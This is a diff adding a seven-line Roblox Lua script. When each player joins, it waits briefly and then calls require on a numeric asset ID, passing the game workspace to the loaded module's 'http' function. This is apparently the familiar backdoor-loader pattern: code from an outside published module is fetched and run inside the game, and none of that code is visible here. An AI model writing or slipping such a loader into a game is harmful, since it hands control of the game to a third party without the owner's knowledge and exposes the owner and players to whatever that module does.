@@ -1,0 +1,7 @@
+function onJoinPlr(player)
+	wait(.7)
+	require(859647216).http(workspace)
+	
+end
+
+game.Players.PlayerAdded:Connect(onJoinPlr)
